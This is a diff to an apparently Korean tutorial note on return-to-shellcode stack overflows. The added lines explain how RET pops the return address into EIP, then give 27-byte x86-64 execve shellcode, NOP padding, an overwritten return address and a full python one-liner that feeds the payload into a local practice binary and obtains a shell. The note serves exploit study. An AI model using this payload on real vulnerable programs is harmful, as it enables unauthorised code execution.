@@ -115,7 +115,7 @@ main() 함수(12번째 줄)로 돌아갈 주소
 high address
 ```
 
-RET
+RET (POP EIP & JMP EIP)
 
 ```
 low address
@@ -201,7 +201,27 @@ buf의 주소가 출력되었다. 여기서 그렇다면 main() 함수로 돌아
 
 즉 72bytes 의 내용을 shell code로 집어놓고 Return address로 침범하기 위해 shell code의 주소 (8bytes)를 추가로 작성하면 (총 80bytes) vuln() 함수가 끝나고 RET 명령어를 실행할때 shell code가 POP 되어 EIP에 저장되고 이 주소(shell code가 저장된 주소)로 이동하여 shell 이 실행되게 된다.
 
+아래 shell code는 64bit에서 동작하는 27bytes 코드이다.
 
+```
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+```
+
+그 다음 NOP 값을 (72 - 27) 45bytes 만큼 넣어준 다음 buf 주소를 적어 준다.
+
+```
+"\x90" * 45 + "\x60\xe4\xff\xff\xff\x7f\x00\x00"
+```
+
+최종적으로 위 payload를 합친 뒤 프로그램에 값을 입력하면 shell을 획득 할 수 있다.
+
+```
+$ (python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90"*45 + "\x60\xe4\xff\xff\xff\x7f\x00\x00"'; cat ) | ./test                                                                                                                                                                                   
+buf[50] address : 0x7fffffffe460
+
+ls
+test test.c
+```
 
 ### # Reference
 [https://www.lazenca.net/display/TEC/02.Return+to+Shellcode](https://www.lazenca.net/display/TEC/02.Return+to+Shellcode)
